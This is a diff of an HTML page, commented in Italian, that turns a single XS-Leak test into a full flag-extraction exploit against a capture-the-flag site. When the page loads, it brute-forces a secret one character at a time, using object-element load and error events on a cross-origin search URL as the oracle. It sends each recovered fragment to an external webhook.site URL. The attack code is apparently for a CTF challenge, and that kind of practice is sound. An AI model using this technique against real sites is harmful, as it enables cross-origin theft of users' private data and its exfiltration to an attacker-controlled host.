@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>XS-Leak Test</title>
+    <title>XS-Leak Flag Extraction</title>
     <style>
         body {
             font-family: Arial, sans-serif;
@@ -16,53 +16,71 @@
     </style>
 </head>
 <body>
-    <h1>XS-Leak Test</h1>
+    <h1>XS-Leak Flag Extraction</h1>
     <div id="result">In attesa di risultati...</div>
 
     <script>
-        const leak = async (url) => {
+        const characters = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789{}_';
+        let flag = 'flag{'; // Inizializza con l'inizio del formato della flag
+        let position = 5;   // Posizione della lettera attuale nella flag da testare
+
+        // Funzione per verificare se un carattere specifico alla posizione attuale è corretto
+        const leakCharacter = async (url) => {
             return new Promise((resolve) => {
                 let s = document.createElement('object');
                 s.data = url;
                 s.onload = (e) => {
                     e.target.remove();
-                    return resolve(0); // Risorsa accessibile
+                    resolve(true); // Carattere corretto
                 };
                 s.onerror = (e) => {
                     e.target.remove();
-                    return resolve(1); // Risorsa non accessibile
+                    resolve(false); // Carattere non corretto
                 };
                 document.body.appendChild(s);
             });
         };
 
-        // Funzione da chiamare al caricamento della pagina
-        const testResourceLeak = async () => {
-            const url = 'https://matrix.capturetheflags.site/search?s=flag{'; // Sostituisci con l'URL da testare
-            const result = await leak(url);
+        // Funzione che prova ogni carattere alla posizione attuale
+        const extractFlag = async () => {
             const resultDiv = document.getElementById('result');
+            
+            for (let char of characters) {
+                // Prova ogni carattere nella posizione corrente
+                const url = `https://matrix.capturetheflags.site/search?s=${flag}${char}`;
+                const isCorrect = await leakCharacter(url);
 
-            let message;
-            if (result === 0) {
-                resultDiv.textContent = 'Risorsa accessibile (status 200)';
-                message = 'Risorsa accessibile';
-            } else {
-                resultDiv.textContent = 'Risorsa non accessibile (status 404 o errore)';
-                message = 'Risorsa non accessibile';
+                if (isCorrect) {
+                    // Aggiorna la flag trovata e sposta alla posizione successiva
+                    flag += char;
+                    position++;
+                    resultDiv.textContent = `Flag parziale trovata: ${flag}`;
+                    
+                    // Invia il log al Webhook con la flag parziale trovata
+                    await logResult(`Flag parziale trovata: ${flag}`);
+
+                    // Se abbiamo trovato "}", terminiamo il ciclo perché la flag è completa
+                    if (char === '}') {
+                        resultDiv.textContent = `Flag completa trovata: ${flag}`;
+                        await logResult(`Flag completa trovata: ${flag}`);
+                        return;
+                    }
+
+                    // Passa alla lettera successiva nella posizione incrementata
+                    break;
+                }
             }
-
-            // Invia il log al server Webhook utilizzando GET
-            await logResult(message);
+            // Ricomincia il processo per la prossima posizione
+            setTimeout(extractFlag, 1000); // Ritardo per evitare sovraccarico
         };
 
         // Funzione per inviare i log al Webhook
         const logResult = async (message) => {
-            const webhookUrl = 'https://webhook.site/d1c2d4d1-02cc-4007-bf6c-1d3cc3528bad'; // Sostituisci con il tuo URL di Webhook.site
+            const webhookUrl = 'https://webhook.site/d1c2d4d1-02cc-4007-bf6c-1d3cc3528bad';
             try {
-                // Costruisci l'URL con il messaggio come parametro
                 const urlWithParams = `${webhookUrl}?message=${encodeURIComponent(message)}`;
                 const response = await fetch(urlWithParams, {
-                    method: 'GET', // Cambiato a GET
+                    method: 'GET',
                 });
 
                 if (!response.ok) {
@@ -75,8 +93,8 @@
             }
         };
 
-        // Esegui il test al caricamento del DOM
-        document.addEventListener('DOMContentLoaded', testResourceLeak);
+        // Avvia l'estrazione della flag al caricamento del DOM
+        document.addEventListener('DOMContentLoaded', extractFlag);
     </script>
 </body>
 </html>
